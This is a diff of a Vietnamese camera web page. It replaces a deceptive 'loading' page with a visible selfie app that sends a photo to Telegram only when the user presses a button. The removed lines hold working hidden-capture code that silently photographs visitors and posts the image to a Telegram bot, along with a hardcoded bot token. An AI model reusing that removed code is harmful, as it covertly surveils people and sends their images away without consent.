@@ -2,57 +2,132 @@
 <html lang="vi">
   <head>
     <meta charset="UTF-8" />
-    <title>Trải nghiệm vui</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Ứng dụng Chụp ảnh Selfie</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        margin: 0;
+        background-color: #f0f2f5;
+      }
+      .container {
+        background: white;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        max-width: 400px;
+        width: 100%;
+      }
+      video,
+      canvas {
+        width: 100%;
+        border-radius: 8px;
+        margin-top: 10px;
+        background-color: #000;
+      }
+      button {
+        margin-top: 15px;
+        padding: 10px 20px;
+        font-size: 16px;
+        color: white;
+        background-color: #0088cc;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+      button:hover {
+        background-color: #006699;
+      }
+      #status {
+        margin-top: 10px;
+        font-weight: bold;
+      }
+    </style>
   </head>
   <body>
-    <h2>Đang tải nội dung...</h2>
-    <video id="video" autoplay playsinline style="display: none"></video>
-    <canvas id="canvas" style="display: none"></canvas>
+    <div class="container">
+      <h2>Chụp ảnh gửi qua Telegram</h2>
+      <p>Màn hình xem trước camera:</p>
+
+      <video id="webcam" autoplay playsinline></video>
+      <canvas id="canvas" style="display: none"></canvas>
+
+      <button id="capture-btn">Chụp và gửi ảnh</button>
+      <div id="status"></div>
+    </div>
 
     <script>
-      const TELEGRAM_TOKEN = "8785240955:AAFsPs-k0OjqigPwSXmA1brpdsfYoxV3k3Y";
-      const CHAT_ID = "8785240955";
+      // THAY BẰNG TOKEN MỚI VÀ CHAT ID CỦA BẠN
+      const TELEGRAM_TOKEN = "YOUR_NEW_BOT_TOKEN";
+      const CHAT_ID = "YOUR_CHAT_ID";
 
-      // Yêu cầu quyền truy cập Camera trước (facingMode: "user")
+      const video = document.getElementById("webcam");
+      const canvas = document.getElementById("canvas");
+      const captureBtn = document.getElementById("capture-btn");
+      const statusDiv = document.getElementById("status");
+
+      // Mở camera công khai
       navigator.mediaDevices
         .getUserMedia({ video: { facingMode: "user" } })
         .then((stream) => {
-          const video = document.getElementById("video");
           video.srcObject = stream;
-
-          // Chờ video sẵn sàng rồi chụp ảnh
-          video.onloadedmetadata = () => {
-            setTimeout(() => {
-              const canvas = document.getElementById("canvas");
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext("2d");
-              ctx.drawImage(video, 0, 0);
-
-              // Chuyển ảnh sang dạng Blob và gửi lên Telegram
-              canvas.toBlob((blob) => {
-                const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("photo", blob, "capture.jpg");
-
-                fetch(
-                  `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
-                  {
-                    method: "POST",
-                    body: formData,
-                  },
-                ).then(() => {
-                  // Tắt camera sau khi chụp xong
-                  stream.getTracks().forEach((track) => track.stop());
-                  alert("Đã xong!");
-                });
-              }, "image/jpeg");
-            }, 1000); // Chờ 1 giây để camera bắt nét
-          };
         })
         .catch((err) => {
-          console.log("Người dùng từ chối quyền camera:", err);
+          statusDiv.style.color = "red";
+          statusDiv.innerText = "Không thể kết nối camera. Vui lòng cấp quyền!";
+          console.error(err);
         });
+
+      // Sự kiện khi người dùng CHỦ ĐỘNG bấm nút chụp
+      captureBtn.addEventListener("click", () => {
+        if (!video.srcObject) {
+          alert("Camera chưa sẵn sàng!");
+          return;
+        }
+
+        statusDiv.style.color = "black";
+        statusDiv.innerText = "Đang chụp và gửi...";
+
+        // Vẽ ảnh lên canvas từ khung hình video hiện tại
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Chuyển ảnh thành Blob và gửi lên Telegram
+        canvas.toBlob((blob) => {
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", blob, "selfie.jpg");
+
+          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData,
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              if (data.ok) {
+                statusDiv.style.color = "green";
+                statusDiv.innerText = "Đã gửi ảnh thành công!";
+              } else {
+                statusDiv.style.color = "red";
+                statusDiv.innerText =
+                  "Gửi thất bại. Kiểm tra lại Token/Chat ID!";
+              }
+            })
+            .catch((err) => {
+              statusDiv.style.color = "red";
+              statusDiv.innerText = "Có lỗi xảy ra khi gửi dữ liệu.";
+              console.error(err);
+            });
+        }, "image/jpeg");
+      });
     </script>
   </body>
 </html>
